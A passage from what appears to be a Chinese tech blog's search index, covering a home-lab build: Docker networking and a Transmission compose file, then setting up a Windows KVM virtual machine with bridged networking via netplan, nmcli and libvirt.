<pre><code>docker attach CONTAINER\ndocker exec -it CONTAINER CMD\n</code></pre> <p><code>attach</code>\u547d\u4ee4\u5c06\u7ec8\u7aef\u7684\u6807\u51c6\u8f93\u5165\uff0c\u6807\u51c6\u8f93\u51fa\uff0c\u6807\u51c6\u9519\u8bef\u8fde\u63a5\u5230\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\u3002\u5982\u679c\u5bb9\u5668\u6b63\u5728\u8fd0\u884c\u7684\u547d\u4ee4\u662f bash\uff0c\u5219 exit \u540e\uff0c\u5bb9\u5668\u9000\u51fa</p> <p><code>exec</code>\u547d\u4ee4\u5728\u5bb9\u5668\u5185\u542f\u52a8\u65b0\u7684\u8fdb\u7a0b\u3002\u5e38\u89c1\u5982 bash</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#docker","title":"Docker","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#network","title":"network","text":"<p>https://docs.docker.com/network/</p>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#host","title":"host","text":"<ul> <li>\u5bb9\u5668\u4e0d\u4f1a\u83b7\u5f97\u81ea\u5df1\u7684 ip</li> <li>\u5982\u679c\u5bb9\u5668\u7ed1\u5b9a\u5728 80 \u7aef\u53e3\uff0c\u5219\u8bbf\u95ee\u4e3b\u673a ip \u7684 80 \u7aef\u53e3\u5373\u53ef</li> <li>\u6709\u5229\u4e8e\u4f18\u5316\u6027\u80fd</li> <li>\u53ea\u5728 linux \u4e0a\u652f\u6301</li> </ul> <p>\u8bbe\u7f6e\u65b9\u6cd5</p> <ul> <li> <p>docker run</p> <pre><code>--network host\n</code></pre> </li> </ul> <ul> <li> <p>compose</p> <pre><code>network_mode: \"host\"\n</code></pre> </li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#bridge","title":"bridge","text":"<ul> <li> <p>\u9ed8\u8ba4 bridge \u7f3a\u70b9</p> <p>If you do not specify a network using the <code>--network</code> flag, and you do specify a network driver, your container is connected to the default <code>bridge</code> network by default. Containers connected to the default <code>bridge</code> network can communicate, but only by IP address, unless they are linked using the legacy <code>--link</code> flag.</p> </li> </ul> <ul> <li> <p>\u81ea\u5df1\u521b\u5efa network</p> <pre><code>docker network create my-net\ndocker network rm my-net\n\n#\u521b\u5efa\u5bb9\u5668\u65f6\u6307\u5b9a\u7f51\u7edc\ndocker create --network\n\n#\u8fde\u63a5\u5df2\u6709\u5bb9\u5668\ndocker network connect my-net my-nginx\ndocker network disconnect my-net my-nginx\n</code></pre> </li> </ul> <ul> <li> <p>\u8bbe\u7f6e\u9ed8\u8ba4 bridge</p> <pre><code>#daemon.json\n{\n  \"bip\": \"192.168.1.1/24\",\n  \"fixed-cidr\": \"192.168.1.0/25\",\n  \"fixed-cidr-v6\": \"2001:db8::/64\",\n  \"mtu\": 1500,\n  \"default-gateway\": \"192.168.1.254\",\n  \"default-gateway-v6\": \"2001:db8:abcd::89\",\n  \"dns\": [\"10.20.1.2\",\"10.20.1.3\"]\n}\n</code></pre> </li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#\u81ea\u542f\u52a8","title":"\u81ea\u542f\u52a8","text":"<pre><code>docker update --restart=always\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#ipv6","title":"ipv6","text":"<p>\u53c2\u8003\uff1aHow Do I Enable IPv6 Support for Docker Containers? | Linode Questions</p> <p>If you need IPv6 support for Docker containers, you need to enable the option on the Docker daemon and reload its configuration, before creating any IPv6 networks or assigning containers IPv6 addresses.</p> <p>When you create your network, you can specify the <code>--ipv6</code> flag to enable IPv6. You can\u2019t selectively disable IPv6 support on the default <code>bridge</code> network.</p> <p>\u5f00\u542f ipv6 \u540e\uff0c\u9ed8\u8ba4 brdige \u81ea\u52a8\u914d\u7f6e\u4e86 ipv6\uff0c\u65e0\u6cd5\u5173\u95ed\uff08\u81ea\u5df1\u521b\u5efa\u7684 bridge network \u624d\u53ef\u4ee5\u4e0d\u542f\u7528 ipv6\uff09</p> <p>If you configure Docker for IPv6 support (see Use IPv6), the default bridge network is also configured for IPv6 automatically. Unlike user-defined bridges, you can\u2019t selectively disable IPv6 on the default bridge.</p> <p>\u6211\u7684\u8def\u7531\u5668\u5f97\u5230\u7684 ipv6 \u662f<code>2001:da8:d800:336:8e53:c3ff:fe86:123d/64</code>\uff0c\u5e94\u8be5\u662f\u6709\u4e00\u4e2a block \u7684\u3002\u4f46\u662f\u5f53\u6211\u8bbe\u7f6e\u4e86 daemon.json \u5185<code>fixed-cidr-v6</code>\u4e3a<code>2001:da8:d800:336::/64</code>\u540e\u3002\u9ed8\u8ba4\u7684 bridge docker0 \u663e\u793a ip \u662f<code>2001:da8:d800:336::1/64</code>\u3002\u5bb9\u5668\u5185\u786e\u5b9e\u83b7\u5f97\u4e86 ipv6 \u5730\u5740\uff0c\u4f46\u662f\u65e0\u6cd5 ping \u901a host \u7269\u7406\u7f51\u5361\u4e0a\u7684 ipv6 \u5730\u5740\u3002\u4e5f\u65e0\u6cd5 ping \u901a\u8def\u7531\u5668\u3002</p> <ul> <li>\u6240\u4ee5\u611f\u89c9\u8def\u7531\u5668\u5f97\u5230\u7684/64 \u7684\u5757\u5e76\u4e0d\u5c5e\u4e8e\u6211\uff0c\u6ca1\u529e\u6cd5\u8fd9\u6837\u914d\u7f6e\u3002</li> <li>\u53ef\u80fd\u8fd8\u662f\u5f97\u914d\u7f6e nat\u3002\u4f46\u662f\u4f7f\u7528 ipv6 \u7684\u8fd8\u662f\u5c11\u6570\uff08PT \u4e0b\u8f7d\u9700\u8981\uff09\uff0c\u56e0\u6b64\u8fd8\u662f\u4f7f\u7528 host \u7f51\u7edc\u7c7b\u578b\u5427\u3002</li> </ul>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#docker-\u5e94\u7528","title":"Docker \u5e94\u7528","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#transmission-pt-\u4e0b\u8f7d","title":"transmission PT \u4e0b\u8f7d","text":"<p>\u8bf4\u660e\uff1atransmission \u662f linux \u4e0b\u7684 BT \u4e0b\u8f7d\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7\u7f51\u9875\u63a7\u5236\uff0c\u6709 docker \u7248\u672c\u3002</p> <p>\u6311\u6218\uff1a\u7531\u4e8e PT \u4e00\u822c\u662f\u53ea\u80fd ipv6 \u8bbf\u95ee\u7684\uff0c\u56e0\u6b64\u8981\u6c42 docker \u5bb9\u5668\u80fd\u591f ipv6 \u8bbf\u95ee\u3002\u53d1\u73b0\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u662f\u7f51\u7edc\u7c7b\u578b\u9009\u62e9 host\u3002</p> <p>\u4ee5\u4e0b docker compose \u662f transmission \u5b98\u65b9\u63d0\u4f9b\u7684\uff0c\u4e3b\u8981\u4fee\u6539\u4e86\u5176\u4e2d network_mode\u3002</p> <ul> <li>\u5176\u4e2d TRANSMISSION_WEB_HOME \u6307\u5b9a\u7f51\u9875\u76ae\u80a4\uff0c\u4f7f\u7528ronggang/transmission-web-control: \u4e00\u4e2a Transmission \u6d4f\u89c8\u5668\u7ba1\u7406\u754c\u9762\u3002Transmission Web Control is a custom web UI. (github.com)</li> <li>\u4f7f\u7528\u5b83\u7684\u811a\u672c\u5b89\u88c5\u6709\u70b9\u95ee\u9898\uff0c\u4e3b\u8981\u662f\u7f51\u7edc\u4e0b\u8f7d\u4e0d\u4e0b\u6765\u3002<ul> <li>\u5c06 git \u4ed3\u5e93\u4e2d\u7684 src \u76ee\u5f55\u8986\u76d6\u5230\u5bb9\u5668\u4e2d\u539f\u672c\u7684 web \u76ee\u5f55\u5373\u53ef</li> <li>\u7136\u540e\u6700\u597d\u4fee\u6539\u4e00\u4e0b TRANSMISSION_WEB_HOME \u4f4d\u7f6e</li> </ul> </li> </ul> <pre><code>---\nversion: \"2.1\"\nservices:\n  transmission:\n    image: lscr.io/linuxserver/transmission:latest\n    container_name: transmission\n    environment:\n      - PUID=1000\n      - PGID=1000\n      - TZ=ASIA/ShangHai\n      - USER=yfy\n      - PASS=abcd4567\n      - PEERPORT=51413\n      - TRANSMISSION_WEB_HOME=/downloads/transmission/web\n    volumes:\n      - /home/yfy/Disk/BT/config:/config\n      - /home/yfy/Disk/BT/downloads:/downloads\n      - /home/yfy/Disk/BT/watch:/watch\n    network_mode: \"host\"\n    restart: unless-stopped\n</code></pre>","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/11/2022-07-11-%E5%8F%B0%E5%BC%8F%E6%9C%BA%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/#jellyfin","title":"jellyfin","text":"","tags":["ntfs","samba","portainer","KVM","LXD","docker"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/","title":"Linux \u5b89\u88c5 windows \u865a\u62df\u673a\u5e76\u663e\u5361\u76f4\u901a","text":"","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"<p>\u5728 linux \u4e0a\u4f7f\u7528 KVM \u5b89\u88c5 windows \u865a\u62df\u673a\u3002\u7136\u540e\u5c06\u663e\u5361\u76f4\u901a (pci passthrough) \u8fdb\u865a\u62df\u673a\uff0c\u4ece\u800c\u53ef\u4ee5\u5728 Windows \u865a\u62df\u673a\u4e0a\u6253\u6e38\u620f\u3002</p> <p>\u8fbe\u5230\u4e00\u53f0\u673a\u5668\u540c\u65f6\u8fd0\u884c\u4e24\u4e2a\u7cfb\u7edf\uff0c\u5145\u5206\u5229\u7528\u786c\u4ef6\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u786c\u4ef6\u4fe1\u606f","title":"\u786c\u4ef6\u4fe1\u606f","text":"<ul> <li>CPU: AMD Ryzen\u2122 7 5800X</li> <li>\u4e3b\u677f\uff1aASUS TUF GAMING B550M-PLUS (WI-FI)</li> <li>RAM: Gloway DDR4 2666MHz 16GBx2</li> <li>GPU slot1: Zotac GTX 1060 3g</li> <li>GPU slot2: Yeston RX550 2g</li> <li>M.2 slot1: Samsung PM9A1 1TB</li> <li>M.2 slot2: KIOXIA RC10 500GB</li> <li>SATA: \u897f\u6570\u7d2b\u76d8 2TB</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u534e\u7855-b550m-\u4e3b\u677f","title":"\u534e\u7855 B550m \u4e3b\u677f","text":"<p>\u5b98\u65b9\u53c2\u6570\uff1aTUF GAMING B550M-PLUS (WI-FI) - Tech Specs\uff5cMotherboards\uff5cASUS Global manual: C16520_TUF_GAMING_B550M-PLUS_WI-FI_UM_12P_WEB.pdf (asus.com.cn)</p> <ul> <li>PCIe slots<ul> <li>\u6765\u81ea ryzen 5000 CPU\uff08\u975e G\uff0c\u5426\u5219\u4e3a PCIE 3.0\uff09<ul> <li>1 x PCIe x16 slot (4.0 x 16 mode)   PCIEX16_1\u652f\u6301pcie\u62c6\u5206\uff0c\u7528\u4e8e\u5b89\u88c5m.2\u6269\u5c55\u5361\uff0c\u53ef\u4ee5\u62c6\u5206\u62104\u4e2a4.0x4\u3002\u9700\u8981\u5728BIOS\u4e2d\u5c06PCIEx16_1\u8bbe\u7f6e\u6210 PCIe RAID Mode\u3002</li> </ul> </li> <li>\u6765\u81ea B550 chipset<ul> <li>1 x PCIe x16 (3.0x4 mode)</li> <li>1 x PCIe x1   *1 PCIEX16_2 will run x2 mode when PCIEX1 is used.</li> </ul> </li> </ul> </li> <li>Storage<ul> <li>2 M.2\uff1aCPU(PCIE4.0 x4), PCH(PCIE3.0 x4)</li> <li>4 SATA 6Gb/s\uff1aPCH</li> </ul> </li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u57fa\u672c-windows-\u865a\u62df\u673a","title":"\u57fa\u672c windows \u865a\u62df\u673a","text":"<p>\u672c\u90e8\u5206\u521b\u5efa\u4e00\u4e2a\u53ef\u7528\u7684 windows \u865a\u62df\u673a\uff0c\u867d\u7136\u6ca1\u6709\u663e\u5361\uff0c\u4f46\u662f\u4e5f\u80fd\u5b8c\u6210\u5f88\u591a\u4e8b\u60c5\uff0c\u6bd4\u5982\u6302\u673a\u5f55\u5c4f\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u901a\u8fc7-virt-manger-\u521b\u5efa\u865a\u62df\u673a","title":"\u901a\u8fc7 virt-manger \u521b\u5efa\u865a\u62df\u673a","text":"<p>libvirt\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u865a\u62df\u673a\u7ba1\u7406 API\uff0c\u53ef\u4ee5\u7ba1\u7406 KVM, Xen, VMvare, QEMU \u7b49\u865a\u62df\u5316\u5de5\u5177\u7684\u865a\u62df\u673a\u3002\u5305\u542b\u5e93 (libvirt)\u3001\u547d\u4ee4\u884c\u5de5\u5177 (virsh)\u3001\u548c virt-manger \u7b49 GUI \u5de5\u5177\u3002\u53c2\u8003\uff1ahttps://wiki.libvirt.org/page/FAQ</p> <p>\u4f7f\u7528 virt-manger \u521b\u5efa win10 \u865a\u62df\u673a\uff0c\u8be6\u7ec6\u6b65\u9aa4\u53c2\u8003\uff1aHow To Install Windows 10 on Ubuntu KVM? \u2013 Getlabsdone.com\u3002\u8fd9\u91cc\u5c31\u4e0d\u518d\u8be6\u7ec6\u4ecb\u7ecd\u4e86\uff0c\u53ea\u63d0\u4e00\u4e9b\u6ce8\u610f\u70b9\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u6dfb\u52a0\u78c1\u76d8\u4e0d\u540c\u65b9\u5f0f","title":"\u6dfb\u52a0\u78c1\u76d8\u4e0d\u540c\u65b9\u5f0f","text":"<p>\u6dfb\u52a0\u78c1\u76d8\u6709\u591a\u79cd\u65b9\u5f0f\uff0c\u4e0d\u540c\u65b9\u5f0f\u7684\u6027\u80fd\u5bf9\u6bd4\uff1a(89) Adding VirtIO and passthrough storage in Virtual Machine Manager - YouTube</p> <ul> <li>\u521b\u5efa qcow2 \u6587\u4ef6<ul> <li>\u53ef\u4ee5\u9009\u62e9 virtio, SATA \u7b49\u603b\u7ebf\u534f\u8bae\u3002virtio \u6027\u80fd\u6700\u597d\uff0c\u4f46\u662f\u5b89\u88c5 windows \u65f6\u9700\u8981\u989d\u5916\u5b89\u88c5\u9a71\u52a8\u3002</li> </ul> </li> <li>\u5229\u7528\u5df2\u6709\u78c1\u76d8\u5206\u533a\uff0c\u540c\u6837\u53ef\u4ee5\u9009\u62e9 virtio, SATA \u7b49\u603b\u7ebf\u534f\u8bae\u3002</li> <li>pci \u76f4\u901a\u78c1\u76d8</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u5b89\u88c5-qxl-\u9a71\u52a8","title":"\u5b89\u88c5 QXL \u9a71\u52a8","text":"<ul> <li>\u5728\u5b89\u88c5\u597d windows \u865a\u62df\u673a\u540e\uff0c\u8fd0\u884c virtio drivers iso \u4e2d\u7684<code>virtio-win-guest-tools.exe</code>\uff0c\u8be5\u7a0b\u5e8f\u4f1a\u5b89\u88c5\u5176\u4f59\u9a71\u52a8\u7a0b\u5e8f\u3002\u6bd4\u8f83\u91cd\u8981\u7684\u662f QXL \u663e\u793a\u9002\u914d\u5668\u9a71\u52a8\uff0c\u8be5\u9a71\u52a8\u4f1a\u4f7f\u5f97\u663e\u793a\u66f4\u52a0\u6d41\u7545</li> </ul> <p>\u6b64\u65f6 windows \u865a\u62df\u673a\u5df2\u7ecf\u53ef\u4ee5\u4f7f\u7528\u4e86\u3002\u4f46\u662f\u521b\u5efa\u865a\u62df\u673a\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u4f7f\u7528\u9ed8\u8ba4\u7684\u7f51\u6865<code>virbr0</code>\uff0c\u800c\u5b83\u662f NAT \u7684\uff0c\u6709\u81ea\u5df1\u7684\u5730\u5740\u6bb5\u3002\u56e0\u6b64 host \u53ef\u4ee5\u8bbf\u95ee\u865a\u62df\u673a\uff0c\u4f46\u662f\u4ece host \u5916\u65e0\u6cd5\u8bbf\u95ee\u865a\u62df\u673a\u3002</p> <p>\u4e3a\u4e86\u8ba9\u5176\u5b83\u8bbe\u5907\u4e5f\u80fd\u81ea\u7531\u8bbf\u95ee\u865a\u62df\u673a\uff0c\u9700\u8981\u8bbe\u7f6e\u4e0b\u9762\u8981\u4ecb\u7ecd\u7684\u865a\u62df\u7f51\u6865</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u4fee\u6539\u4e3a\u6865\u63a5\u7f51\u7edc","title":"\u4fee\u6539\u4e3a\u6865\u63a5\u7f51\u7edc","text":"<p>\u4f7f\u7528 docker\u3001lxc\u3001libvirt \u65f6\uff0c\u90fd\u4f1a\u521b\u5efa\u9ed8\u8ba4\u7684 bridge \u8bbe\u5907\uff0c\u5982 virbr0 \u4fbf\u662f libvirt \u521b\u5efa\u7684\u3002</p> <pre><code>\u279c  ~ brctl show\nbridge name     bridge id               STP enabled     interfaces\nbr-d1cfd67efd10         8000.0242abdcc8f5       no              veth461ccef\nbr0             8000.be316828842b       yes             enp7s0\n                                                        vnet1\ndocker0         8000.0242ff18344e       no              veth2305c74\n                                                        veth69f27d6\nlxdbr0          8000.00163ecbf2fc       no\nvirbr0          8000.525400bf6a2c       yes             vnet0\n</code></pre> <p>libvirt \u521b\u5efa\u4e0d\u540c\u7c7b\u578b\u7f51\u7edc\u53c2\u8003\uff1aNetworking - Libvirt Wiki</p> <ul> <li>nat\uff1a\u865a\u62df\u673a\u4f4d\u4e8e\u4e00\u4e2a\u865a\u62df\u7684\u7f51\u6bb5\uff0c\u901a\u8fc7 nat \u5230\u5bbf\u4e3b\u673a\u4e0a\u7f51\u3002libvirt \u9ed8\u8ba4\u63d0\u4f9b\u4e00\u4e2a\u53eb\u505a<code>default</code>\u7684\u7f51\u7edc</li> <li>bridge\uff1a\u865a\u62df\u673a\u548c\u7269\u7406\u673a\u5171\u4eab\u7f51\u7edc\u3002</li> </ul> <p>\u865a\u62df\u673a\u60f3\u8981\u4f7f\u7528 bridge \u6a21\u5f0f\uff0c\u5206\u4e3a\u4e24\u6b65</p> <ul> <li>\u5728 linux \u4e2d\u521b\u5efa bridge \u8bbe\u5907</li> <li>virt-manger \u4e2d\u521b\u5efa\u7f51\u7edc\uff0c\u4f7f\u7528\u8be5 bridge \u8bbe\u5907</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#netplannetworkd\u521b\u5efabridge","title":"netplan/networkd\u521b\u5efabridge","text":"<p>ubuntu20.04 \u8d77\u4f7f\u7528 netplan \u7ba1\u7406\u7f51\u7edc\uff0c\u684c\u9762\u7248\u7684 render \u4f7f\u7528 NetworkManger\uff0c\u670d\u52a1\u5668\u7248\u5219\u4f7f\u7528 networkd\u3002</p> <ul> <li>NetworkManger \u7528\u4e8e\u56fe\u5f62\u5316\u754c\u9762\u7ba1\u7406\u7f51\u7edc</li> <li>networkd \u4f7f\u7528\u914d\u7f6e\u6587\u4ef6\u7ba1\u7406 \u5bf9\u4e8e\u590d\u6742\u7684\u7f51\u7edc\u6765\u8bf4\uff0c\u8fd8\u662f networkd \u66f4\u5408\u9002\u3002</li> </ul> <p>ps. \u8fd8\u6709\u5176\u5b83\u65b9\u5f0f\uff0c\u5982\u4f7f\u7528 iproute2/ip, bridge-utils/brctl\u521b\u5efabridge\uff0c\u53c2\u8003\uff1aNetwork bridge - ArchWiki (archlinux.org)</p> <ul> <li>\u5173\u95ed NetworkManger\uff0c\u542f\u52a8 networkd</li> </ul> <pre><code>sudo systemctl stop NetworkManager\nsudo systemctl disable NetworkManager\n\nsudo systemctl enable systemd-networkd\nsudo systemctl start systemd-networkd\n</code></pre> <ul> <li>\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6<ul> <li>eth0 \u6539\u4e3a\u5b9e\u9645\u7f51\u5361\u540d\u5b57\uff0cpcie \u7f51\u5361\u524d\u7f00\u4e00\u822c\u4e3a enp</li> <li>\u5176\u4e2d eth0 dchp4 false \u8868\u793a\u8be5\u63a5\u53e3\u4e0a\u4e0d\u4f1a\u5c1d\u8bd5\u53bb dhcp \u8bf7\u6c42 ip \u5730\u5740\u3002\u8981\u60f3\u8bbf\u95ee host\uff0c\u9700\u8981\u901a\u8fc7 br0 \u7684 ip \u5730\u5740</li> </ul> </li> </ul> <pre><code>cd /etc/netplan/\n# \u5907\u4efd\u539f\u672c\u7684\u914d\u7f6e\nmv 01-xxx.yaml 01-xxx.yaml.bak\n\n# \u65b0\u5efa\u914d\u7f6e\nvim 10-yyy.yaml\n</code></pre> <pre><code># 10-yyy.yaml\nnetwork:\n  version: 2\n  renderer: networkd\n  ethernets:\n    eth0:\n      dhcp4: false\n      dhcp6: false\n  bridges:\n    br0:\n      dhcp4: true\n      dhcp6: true\n      interfaces:\n        - eth0\n</code></pre> <ul> <li>\u5e94\u7528`netplan apply</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#networkmanger\u4e0d\u63a8\u8350","title":"NetworkManger(\u4e0d\u63a8\u8350)","text":"<p>ubuntu20.04 \u4f7f\u7528 netplan \u7ba1\u7406\u7f51\u7edc\uff0c\u5176\u4e2d\u684c\u9762\u7248 render \u4f7f\u7528 NetworkManger\uff0c\u4e00\u4e9b\u6559\u7a0b\u4f7f\u7528/etc/network/interfaces \u521b\u5efa bridge \u8bbe\u5907\u5df2\u7ecf\u4e0d\u9002\u7528\u4e86\u3002</p> <p>\u4f7f\u7528 NetworkManger \u521b\u5efa bridge \u53c2\u8003\uff1aHow to add network bridge with nmcli (NetworkManager) on Linux - nixCraft (cyberciti.biz)</p> <pre><code>nmcli con add ifname br0 type bridge con-name br0\nnmcli con add type bridge-slave ifname enp7s0 master br0\n</code></pre> <p>\u6ce8\u610f\u70b9</p> <ul> <li> <p>\u542f\u7528\u4e86 bridge \u8bbe\u5907\u65f6\uff0c\u9700\u8981\u5173\u95ed\u539f\u6709\u4ee5\u592a\u7f51\u8bbe\u5907\u3002\u4e4b\u540e\u8bbf\u95ee\u673a\u5668\u5f97\u901a\u8fc7 br0\u3002</p> <pre><code>sudo nmcli con down \"Wired connection 1\"\nsudo nmcli con up br0\n</code></pre> <ul> <li>ssh \u8fde\u63a5\u65f6\u4f1a\u5bfc\u81f4\u8fde\u63a5\u65ad\u5f00\uff0c\u56e0\u6b64\u9700\u8981\u7528\u811a\u672c\u6267\u884c\u4e0a\u9762\u4e24\u6761\u547d\u4ee4\u3002</li> <li>\u65b0\u542f\u7528\u7684 br0 \u4f1a\u62e5\u6709 LAN \u7684 ip \u5730\u5740\uff0c\u4f46\u662f\u5730\u5740\u76f8\u8f83\u4e8e\u539f\u672c\u5730\u5740\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u53ef\u4ee5\u5728\u8def\u7531\u5668\u4e2d\u770b\u5230\u65b0\u7684 ip \u5730\u5740\uff0c\u7136\u540e ssh \u8fde\u63a5<ul> <li>\u6216\u8005\u4f7f\u7528 wifi \u7ef4\u6301\u53e6\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5</li> </ul> </li> <li>\u65e0\u6cd5\u5728 wifi \u8bbe\u5907\u4e0a\u521b\u5efa bridge\uff0c\u53ea\u80fd\u662f\u6709\u7ebf\u4ee5\u592a\u7f51\u3002</li> </ul> </li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#virt-manger-\u6dfb\u52a0\u7f51\u7edc","title":"virt-manger \u6dfb\u52a0\u7f51\u7edc","text":"<p>virt-manger \u4e2d\uff0c\u5728\u7f16\u8f91-&gt;\u8fde\u63a5\u8be6\u60c5-&gt;\u865a\u62df\u7f51\u7edc\u6dfb\u52a0\u4e00\u4e2a\u7f51\u7edc</p> <pre><code>&lt;network&gt;\n  &lt;name&gt;br0&lt;/name&gt;\n  &lt;forward mode=\"bridge\"/&gt;\n  &lt;bridge name=\"br0\" /&gt;\n&lt;/network&gt;\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u663e\u5361\u76f4\u901a","title":"\u663e\u5361\u76f4\u901a","text":"","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> 